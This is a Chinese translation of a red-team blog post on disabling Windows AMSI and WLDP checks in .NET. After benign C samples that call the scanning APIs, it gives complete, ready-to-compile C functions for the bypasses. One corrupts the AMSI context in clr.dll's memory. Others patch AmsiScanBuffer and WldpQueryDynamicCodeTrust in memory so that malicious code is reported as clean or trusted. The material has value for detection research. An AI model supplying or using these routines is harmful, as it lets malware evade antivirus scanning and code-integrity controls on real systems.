> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/5351)

原文地址：[https://modexp.wordpress.com/2019/06/03/disable-amsi-wldp-dotnet/](https://modexp.wordpress.com/2019/06/03/disable-amsi-wldp-dotnet/)

简介
--

自从 [4.8 版本](https://devblogs.microsoft.com/dotnet/announcing-the-net-framework-4-8/ "4.8版本")开始，.NET 框架引入了 Antimalware Scan Interface（AMSI）和 Windows Lockdown Policy（WLDP）安全机制，用来阻止潜在的恶意软件从内存运行。WLDP 机制会检查动态代码的数字签名，而 AMSI 机制则会扫描有害或被管理员禁止的软件。在本文中，我们将会为红队队员介绍三种绕过 AMSI 安全机制的方法，以及一种绕过 WLDP 安全机制的方法。对于文中介绍的方法，并不要求读者具备 AMSI 或 WLDP 方面的专业知识。

利用 C 语言编写的 AMSI 示例
------------------

对于给定的文件路径，可以通过以下函数将打开该文件，将其映射到内存，并使用 AMSI 机制检查文件内容是否有害或被管理员禁止。

```
typedef HRESULT (WINAPI *AmsiInitialize_t)(
  LPCWSTR      appName,
  HAMSICONTEXT *amsiContext);

typedef HRESULT (WINAPI *AmsiScanBuffer_t)(
  HAMSICONTEXT amsiContext,
  PVOID        buffer,
  ULONG        length,
  LPCWSTR      contentName,
  HAMSISESSION amsiSession,
  AMSI_RESULT  *result);

typedef void (WINAPI *AmsiUninitialize_t)(
  HAMSICONTEXT amsiContext);

BOOL IsMalware(const char *path) {
    AmsiInitialize_t   _AmsiInitialize;
    AmsiScanBuffer_t   _AmsiScanBuffer;
    AmsiUninitialize_t _AmsiUninitialize;
    HAMSICONTEXT       ctx;
    AMSI_RESULT        res;
    HMODULE            amsi;

    HANDLE             file, map, mem;
    HRESULT            hr = -1;
    DWORD              size, high;
    BOOL               malware = FALSE;

    // load amsi library
    amsi = LoadLibrary("amsi");

    // resolve functions
    _AmsiInitialize = 
      (AmsiInitialize_t)
      GetProcAddress(amsi, "AmsiInitialize");

    _AmsiScanBuffer =
      (AmsiScanBuffer_t)
      GetProcAddress(amsi, "AmsiScanBuffer");

    _AmsiUninitialize = 
      (AmsiUninitialize_t)
      GetProcAddress(amsi, "AmsiUninitialize");

    // return FALSE on failure
    if(_AmsiInitialize   == NULL ||
       _AmsiScanBuffer   == NULL ||
       _AmsiUninitialize == NULL) {
      printf("Unable to resolve AMSI functions.\n");
      return FALSE;
    }

    // open file for reading
    file = CreateFile(
      path, GENERIC_READ, FILE_SHARE_READ,
      NULL, OPEN_EXISTING, 
      FILE_ATTRIBUTE_NORMAL, NULL); 

    if(file != INVALID_HANDLE_VALUE) {
      // get size
      size = GetFileSize(file, &high);
      if(size != 0) {
        // create mapping
        map = CreateFileMapping(
          file, NULL, PAGE_READONLY, 0, 0, 0);

        if(map != NULL) {
          // get pointer to memory
          mem = MapViewOfFile(
            map, FILE_MAP_READ, 0, 0, 0);

          if(mem != NULL) {
            // scan for malware
            hr = _AmsiInitialize(L"AMSI Example", &ctx);
            if(hr == S_OK) {
              hr = _AmsiScanBuffer(ctx, mem, size, NULL, 0, &res);
              if(hr == S_OK) {
                malware = (AmsiResultIsMalware(res) || 
                           AmsiResultIsBlockedByAdmin(res));
              }
              _AmsiUninitialize(ctx);
            }              
            UnmapViewOfFile(mem);
          }
          CloseHandle(map);
        }
      }
      CloseHandle(file);
    }
    return malware;
}
```

下面，让我们分别扫描一个正常的文件和一个[恶意](https://github.com/GhostPack/SafetyKatz "恶意")文件。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20190605000225-2506d690-86e2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190605000225-2506d690-86e2-1.png)

如果您已经熟悉 AMSI 的内部机制，可以跳过下面一节的内容，直接阅读相关的绕过方法。

AMSI 的上下文结构
-----------

context 是一个未有公开文档说明的结构，不过，我们可以通过下面的代码来了解这个返回的句柄。

```
typedef struct tagHAMSICONTEXT {
  DWORD        Signature;          // "AMSI" or 0x49534D41
  PWCHAR       AppName;            // set by AmsiInitialize
  IAntimalware *Antimalware;       // set by AmsiInitialize
  DWORD        SessionCount;       // increased by AmsiOpenSession
} _HAMSICONTEXT, *_PHAMSICONTEXT;
```

AMSI 初始化
--------

appName 是一个指向 unicode 格式的用户定义字符串的指针，而 amsiContext 则是指向 HAMSICONTEXT 类型的句柄的一个指针。当成功初始化 AMSI 的 context 结构之后，会返回 S_OK。虽然以下代码并非完整的函数实现，但对于了解其内部运行机制来说，是非常有帮助的。

```
HRESULT _AmsiInitialize(LPCWSTR appName, HAMSICONTEXT *amsiContext) {
    _HAMSICONTEXT *ctx;
    HRESULT       hr;
    int           nameLen;
    IClassFactory *clsFactory = NULL;

    // invalid arguments?
    if(appName == NULL || amsiContext == NULL) {
      return E_INVALIDARG;
    }

    // allocate memory for context
    ctx = (_HAMSICONTEXT*)CoTaskMemAlloc(sizeof(_HAMSICONTEXT));
    if(ctx == NULL) {
      return E_OUTOFMEMORY;
    }

    // initialize to zero
    ZeroMemory(ctx, sizeof(_HAMSICONTEXT));

    // set the signature to "AMSI"
    ctx->Signature = 0x49534D41;

    // allocate memory for the appName and copy to buffer
    nameLen = (lstrlen(appName) + 1) * sizeof(WCHAR);
    ctx->AppName = (PWCHAR)CoTaskMemAlloc(nameLen);

    if(ctx->AppName == NULL) {
      hr = E_OUTOFMEMORY;
    } else {
      // set the app name
      lstrcpy(ctx->AppName, appName);

      // instantiate class factory
      hr = DllGetClassObject(
        CLSID_Antimalware, 
        IID_IClassFactory, 
        (LPVOID*)&clsFactory);

      if(hr == S_OK) {
        // instantiate Antimalware interface
        hr = clsFactory->CreateInstance(
          NULL,
          IID_IAntimalware, 
          (LPVOID*)&ctx->Antimalware);

        // free class factory
        clsFactory->Release();

        // save pointer to context
        *amsiContext = ctx;
      }
    }

    // if anything failed, free context
    if(hr != S_OK) {
      AmsiFreeContext(ctx);
    }
    return hr;
}
```

其中，HAMSICONTEXT 结构的内存空间是在堆上分配的，并使用 appName、AMSI 签名（0x49534D41）和 [IAntimalware](https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nn-amsi-iantimalware "IAntimalware") 接口进行初始化处理。

AMSI 扫描
-------

通过下面的代码，我们可以大致了解调用函数时会执行哪些操作。如果扫描成功，则返回的结果将为 S_OK，并且应检查 [AMSI_RESULT](https://docs.microsoft.com/en-us/windows/desktop/api/amsi/ne-amsi-amsi_result "AMSI_RESULT")，以确定缓冲区是否包含有害的软件。

```
HRESULT _AmsiScanBuffer(
  HAMSICONTEXT amsiContext,
  PVOID        buffer,
  ULONG        length,
  LPCWSTR      contentName,
  HAMSISESSION amsiSession,
  AMSI_RESULT  *result)
{
    _HAMSICONTEXT *ctx = (_HAMSICONTEXT*)amsiContext;

    // validate arguments
    if(buffer           == NULL       ||
       length           == 0          ||
       amsiResult       == NULL       ||
       ctx              == NULL       ||
       ctx->Signature   != 0x49534D41 ||
       ctx->AppName     == NULL       ||
       ctx->Antimalware == NULL)
    {
      return E_INVALIDARG;
    }

    // scan buffer
    return ctx->Antimalware->Scan(
      ctx->Antimalware,     // rcx = this
      &CAmsiBufferStream,   // rdx = IAmsiBufferStream interface
      amsiResult,           // r8  = AMSI_RESULT
      NULL,                 // r9  = IAntimalwareProvider
      amsiContext,          // HAMSICONTEXT
      CAmsiBufferStream,
      buffer,
      length, 
      contentName,
      amsiSession);
}
```

请注意这里是如何对参数进行验证的。这是强制 AmsiScanBuffer 运行失败并返回 E_INVALIDARG 的众多方法之一。

　AMSI 的 CLR 实现
--------------

CLR 使用一个名为 AmsiScan 的私有函数来检测通过 Load 方法传递的有害软件。以下代码演示了 CLR 是如何实现 AMSI 的。

```
AmsiScanBuffer_t _AmsiScanBuffer;
AmsiInitialize_t _AmsiInitialize;
HAMSICONTEXT     *g_amsiContext;

VOID AmsiScan(PVOID buffer, ULONG length) {
    HMODULE          amsi;
    HAMSICONTEXT     *ctx;
    HAMSI_RESULT     amsiResult;
    HRESULT          hr;

    // if global context not initialized
    if(g_amsiContext == NULL) {
      // load AMSI.dll
      amsi = LoadLibraryEx(
        L"amsi.dll", 
        NULL, 
        LOAD_LIBRARY_SEARCH_SYSTEM32);

      if(amsi != NULL) {
        // resolve address of init function
        _AmsiInitialize = 
          (AmsiInitialize_t)GetProcAddress(amsi, "AmsiInitialize");

        // resolve address of scanning function
        _AmsiScanBuffer =
          (AmsiScanBuffer_t)GetProcAddress(amsi, "AmsiScanBuffer");

        // failed to resolve either? exit scan
        if(_AmsiInitialize == NULL ||
           _AmsiScanBuffer == NULL) return;

        hr = _AmsiInitialize(L"DotNet", &ctx);

        if(hr == S_OK) {
          // update global variable
          g_amsiContext = ctx;
        }
      }
    }
    if(g_amsiContext != NULL) {
      // scan buffer
      hr = _AmsiScanBuffer(
        g_amsiContext,
        buffer,
        length,
        0,
        0,        
        &amsiResult);

      if(hr == S_OK) {
        // if malware was detected or it's blocked by admin
        if(AmsiResultIsMalware(amsiResult) ||
           AmsiResultIsBlockedByAdmin(amsiResult))
        {
          // "Operation did not complete successfully because "
          // "the file contains a virus or potentially unwanted" 
          // software.
          GetHRMsg(ERROR_VIRUS_INFECTED, &error_string, 0);
          ThrowHR(COR_E_BADIMAGEFORMAT, &error_string);          
        }           
      }
    }
}
```

我们看到，CLR 使用了一个名为 g_amsiContext 的全局变量，该变量指向 AmsiInitialize 在首次使用 AmsiScan 时创建的 AMSI 上下文。这里需要注意的是，如果 AMSI 的上下文被破坏，AmsiScan 并不会抛出任何错误。如果 AmsiScanBuffer 返回 S_OK，则只会检查 amsiResult。使用 COR_E_BADIMAGEFORMAT 和 ERROR_VIRUS_INFECTED 来调用 ThrowHR 时，即使缓冲区确实包含有害代码，也会将其视为次要错误。但是，如果将格式错误的上下文传递给 AmsiScanBuffer 的话，它将返回 E_INVALIDARG，并且永远不会检查缓冲区的内容。此外，AmsiScan 并不关心 AmsiScanBuffer 失败的原因。但是，真正需要重点考察的应该是，“既然系统支持 AMSI 并且检测失败了，那么失败的原因到底是什么呢？”。

第一种绕过 AMSI 机制的方法（篡改数据）
----------------------

Matt Graeber 提供了一个 PoC，它能够破坏 CLR!g_amsiContext 所指向的上下文数据，从而导致 AmsiScanBuffer 返回 E_INVALIDARG。从 CLR 的实现代码可以看出，这种绕过方法是有效的，因为 CLR!AmsiScan 的结果永远不会是验证成功或失败。相反，它只会抛出一个错误，并在尝试加载有害软件时终止宿主应用程序。但是，托管. NET 程序集的非托管应用程序可能会处理任何 C++ 异常。Windows Defender 仍会记录有害代码的检测结果，但非托管宿主应用程序在某些情况下会继续运行。要通过 g_amsiContext 禁用 AMSI，可以搜索 PEB.ProcessHeap 指向的堆内存，也可以搜索. data 段的虚拟地址空间，并查找其中的每个指针。下面的代码演示的是后一种方法。只有 CLR 调用 AmsiScan 之后，这种方法才能奏效。

```
BOOL DisableAMSI(VOID) {
    LPVOID                   hCLR;
    BOOL                     disabled = FALSE;
    PIMAGE_DOS_HEADER        dos;
    PIMAGE_NT_HEADERS        nt;
    PIMAGE_SECTION_HEADER    sh;
    DWORD                    i, j, res;
    PBYTE                    ds;
    MEMORY_BASIC_INFORMATION mbi;
    _PHAMSICONTEXT           ctx;

    hCLR = GetModuleHandleA("CLR");

    if(hCLR != NULL) {
      dos = (PIMAGE_DOS_HEADER)hCLR;  
      nt  = RVA2VA(PIMAGE_NT_HEADERS, hCLR, dos->e_lfanew);  
      sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
             nt->FileHeader.SizeOfOptionalHeader);

      // scan all writeable segments while disabled == FALSE
      for(i = 0; 
          i < nt->FileHeader.NumberOfSections && !disabled; 
          i++) 
      {
        // if this section is writeable, assume it's data
        if (sh[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
          // scan section for pointers to the heap
          ds = RVA2VA (PBYTE, hCLR, sh[i].VirtualAddress);

          for(j = 0; 
              j < sh[i].Misc.VirtualSize - sizeof(ULONG_PTR); 
              j += sizeof(ULONG_PTR)) 
          {
            // get pointer
            ULONG_PTR ptr = *(ULONG_PTR*)&ds[j];
            // query if the pointer
            res = VirtualQuery((LPVOID)ptr, &mbi, sizeof(mbi));
            if(res != sizeof(mbi)) continue;

            // if it's a pointer to heap or stack
            if ((mbi.State   == MEM_COMMIT    ) &&
                (mbi.Type    == MEM_PRIVATE   ) && 
                (mbi.Protect == PAGE_READWRITE))
            {
              ctx = (_PHAMSICONTEXT)ptr;
              // check if it contains the signature 
              if(ctx->Signature == 0x49534D41) {
                // corrupt it
                ctx->Signature++;
                disabled = TRUE;
                break;
              }
            }
          }
        }
      }
    }
    return disabled;
}
```

　第二种绕过 AMSI 机制的方法（代码补丁方法 1）
---------------------------

CyberArk 建议使用 2 条指令，即 xor edi，edi，nop 来修改 AmsiScanBuffer。如果要 hook 该函数的话，可以借助 Length Disassembler Engine（LDE）来计算在跳转到备用函数进行覆盖之前要保存的 prolog 字节的正确数量。由于传递给该函数的 AMSI 上下文已经过验证，并且其中一个测试要求签名为 “AMSI”，因此，您可以找到该立即值，并将其更改为其他值。在下面的示例中，我们将通过代码来破坏相应的签名，而不是像 Matt Graeber 那样使用上下文 / 数据来破坏相应的签名。

```
BOOL DisableAMSI(VOID) {
    HMODULE        dll;
    PBYTE          cs;
    DWORD          i, op, t;
    BOOL           disabled = FALSE;
    _PHAMSICONTEXT ctx;

    // load AMSI library
    dll = LoadLibraryExA(
      "amsi", NULL, 
      LOAD_LIBRARY_SEARCH_SYSTEM32);

    if(dll == NULL) {
      return FALSE;
    }
    // resolve address of function to patch
    cs = (PBYTE)GetProcAddress(dll, "AmsiScanBuffer");

    // scan for signature
    for(i=0;;i++) {
      ctx = (_PHAMSICONTEXT)&cs[i];
      // is it "AMSI"?
      if(ctx->Signature == 0x49534D41) {
        // set page protection for write access
        VirtualProtect(cs, sizeof(ULONG_PTR), 
          PAGE_EXECUTE_READWRITE, &op);

        // change signature
        ctx->Signature++;

        // set page back to original protection
        VirtualProtect(cs, sizeof(ULONG_PTR), op, &t);
        disabled = TRUE;
        break;
      }
    }
    return disabled;
}
```

第三种绕过 AMSI 机制的方法（代码补丁方法 2）
--------------------------

Tal Liberman 建议覆盖 AmsiScanBuffer 的 prolog 字节，以便使其返回 1。下面的代码也会对该函数执行覆盖操作，以使其在 CLR 扫描每个缓冲区时都返回 AMSI_RESULT_CLEAN 和 S_OK。

```
// fake function that always returns S_OK and AMSI_RESULT_CLEAN
static HRESULT AmsiScanBufferStub(
  HAMSICONTEXT amsiContext,
  PVOID        buffer,
  ULONG        length,
  LPCWSTR      contentName,
  HAMSISESSION amsiSession,
  AMSI_RESULT  *result)
{
    *result = AMSI_RESULT_CLEAN;
    return S_OK;
}

static VOID AmsiScanBufferStubEnd(VOID) {}

BOOL DisableAMSI(VOID) {
    BOOL    disabled = FALSE;
    HMODULE amsi;
    DWORD   len, op, t;
    LPVOID  cs;

    // load amsi
    amsi = LoadLibrary("amsi");

    if(amsi != NULL) {
      // resolve address of function to patch
      cs = GetProcAddress(amsi, "AmsiScanBuffer");

      if(cs != NULL) {
        // calculate length of stub
        len = (ULONG_PTR)AmsiScanBufferStubEnd -
          (ULONG_PTR)AmsiScanBufferStub;

        // make the memory writeable
        if(VirtualProtect(
          cs, len, PAGE_EXECUTE_READWRITE, &op))
        {
          // over write with code stub
          memcpy(cs, &AmsiScanBufferStub, len);

          disabled = TRUE;

          // set back to original protection
          VirtualProtect(cs, len, op, &t);
        }
      }
    }
    return disabled;
}
```

应用补丁后，我们发现有害软件也会被标记为安全的软件。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20190604235946-c683b034-86e1-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190604235946-c683b034-86e1-1.png)

使用 C 语言编写的 WLDP 示例
------------------

以下函数演示了如何使用 Windows Lockdown Policy 来检测内存中动态代码的可信任状况。

```
BOOL VerifyCodeTrust(const char *path) {
    WldpQueryDynamicCodeTrust_t _WldpQueryDynamicCodeTrust;
    HMODULE                     wldp;
    HANDLE                      file, map, mem;
    HRESULT                     hr = -1;
    DWORD                       low, high;

    // load wldp
    wldp = LoadLibrary("wldp");
    _WldpQueryDynamicCodeTrust = 
      (WldpQueryDynamicCodeTrust_t)
      GetProcAddress(wldp, "WldpQueryDynamicCodeTrust");

    // return FALSE on failure
    if(_WldpQueryDynamicCodeTrust == NULL) {
      printf("Unable to resolve address for WLDP.dll!WldpQueryDynamicCodeTrust.\n");
      return FALSE;
    }

    // open file reading
    file = CreateFile(
      path, GENERIC_READ, FILE_SHARE_READ,
      NULL, OPEN_EXISTING, 
      FILE_ATTRIBUTE_NORMAL, NULL); 

    if(file != INVALID_HANDLE_VALUE) {
      // get size
      low = GetFileSize(file, &high);
      if(low != 0) {
        // create mapping
        map = CreateFileMapping(file, NULL, PAGE_READONLY, 0, 0, 0);
        if(map != NULL) {
          // get pointer to memory
          mem = MapViewOfFile(map, FILE_MAP_READ, 0, 0, 0);
          if(mem != NULL) {
            // verify signature
            hr = _WldpQueryDynamicCodeTrust(0, mem, low);              
            UnmapViewOfFile(mem);
          }
          CloseHandle(map);
        }
      }
      CloseHandle(file);
    }
    return hr == S_OK;
}
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20190605000021-db43bae6-86e1-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190605000021-db43bae6-86e1-1.png)

　绕过 WLDP 机制的方法（代码补丁方法 1）
------------------------

通过对该函数执行覆盖操作，使其始终返回 S_OK。

```
// fake function that always returns S_OK
static HRESULT WINAPI WldpQueryDynamicCodeTrustStub(
    HANDLE fileHandle,
    PVOID  baseImage,
    ULONG  ImageSize)
{
    return S_OK;
}

static VOID WldpQueryDynamicCodeTrustStubEnd(VOID) {}

static BOOL PatchWldp(VOID) {
    BOOL    patched = FALSE;
    HMODULE wldp;
    DWORD   len, op, t;
    LPVOID  cs;

    // load wldp
    wldp = LoadLibrary("wldp");

    if(wldp != NULL) {
      // resolve address of function to patch
      cs = GetProcAddress(wldp, "WldpQueryDynamicCodeTrust");

      if(cs != NULL) {
        // calculate length of stub
        len = (ULONG_PTR)WldpQueryDynamicCodeTrustStubEnd -
          (ULONG_PTR)WldpQueryDynamicCodeTrustStub;

        // make the memory writeable
        if(VirtualProtect(
          cs, len, PAGE_EXECUTE_READWRITE, &op))
        {
          // over write with stub
          memcpy(cs, &WldpQueryDynamicCodeTrustStub, len);

          patched = TRUE;

          // set back to original protection
          VirtualProtect(cs, len, op, &t);
        }
      }
    }
    return patched;
}
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20190605000107-f67e0082-86e1-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190605000107-f67e0082-86e1-1.png)

虽然本文描述的方法很容易被检测到，但是它们对于 Windows 10 系统上最新版本的 DotNet 框架而言，仍然是有效的。实际上，只要攻击者能够篡改 AMSI 用来检测有害代码的数据或代码，就总能找到绕过这些安全机制的方法。

参考文献
----

*   [Bypassing Amsi using PowerShell 5 DLL Hijacking](http://cn33liz.blogspot.com/2016/05/bypassing-amsi-using-powershell-5-dll.html "Bypassing Amsi using PowerShell 5 DLL Hijacking by Cneelis")
*   [Bypassing AMSI via COM Server Hijacking](https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/ "Bypassing AMSI via COM Server Hijacking")
*   [Bypassing Device Guard with .NET Assembly Compilation Methods](http://www.exploit-monday.com/2017/07/bypassing-device-guard-with-dotnet-methods.html "Bypassing Device Guard with .NET Assembly Compilation Methods")
*   [AMSI Bypass With a Null Character](http://standa-note.blogspot.com/2018/02/amsi-bypass-with-null-character.html "AMSI Bypass With a Null Character")
*   [AMSI Bypass: Patching Technique](https://www.cyberark.com/threat-research-blog/amsi-bypass-patching-technique/ "AMSI Bypass: Patching Technique")
*   [The Rise and Fall of AMSI](https://i.blackhat.com/briefings/asia/2018/asia-18-Tal-Liberman-Documenting-the-Undocumented-The-Rise-and-Fall-of-AMSI.pdf "The Rise and Fall of AMSI")
*   [AMSI Bypass Redux](https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/ "AMSI Bypass Redux")
*   [Exploring PowerShell AMSI and Logging Evasion](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/ "Exploring PowerShell AMSI and Logging Evasion")
*   [Disabling AMSI in JScript with One Simple Trick](https://tyranidslair.blogspot.com/2018/06/disabling-amsi-in-jscript-with-one.html "Disabling AMSI in JScript with One Simple Trick")
*   [Documenting and Attacking a Windows Defender Application Control Feature the Hard Way – A Case Study in Security Research Methodology](https://posts.specterops.io/documenting-and-attacking-a-windows-defender-application-control-feature-the-hard-way-a-case-73dd1e11be3a "Documenting and Attacking a Windows Defender Application Control Feature the Hard Way – A Case Study in Security Research Methodology")
*   [How to bypass AMSI and execute ANY malicious Powershell code](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html "How to bypass AMSI and execute ANY malicious Powershell code")
*   AmsiScanBuffer Bypass [Part 1](https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-1/ "Part 1"), [Part 2](https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-2/ "Part 2"), [Part 3](https://rastamouse.me/2018/11/amsiscanbuffer-bypass-part-3/ " Part 3"), [Part 4](https://rastamouse.me/2018/12/amsiscanbuffer-bypass-part-4/ "Part 4")
*   [PoC function to corrupt the g_amsiContext global variable in clr.dll](https://outflank.nl/blog/2019/04/17/bypassing-amsi-for-vba/ "PoC function to corrupt the g_amsiContext global variable in clr.dll")
*   [Bypassing AMSI for VBA](https://outflank.nl/blog/2019/04/17/bypassing-amsi-for-vba/ "Bypassing AMSI for VBA")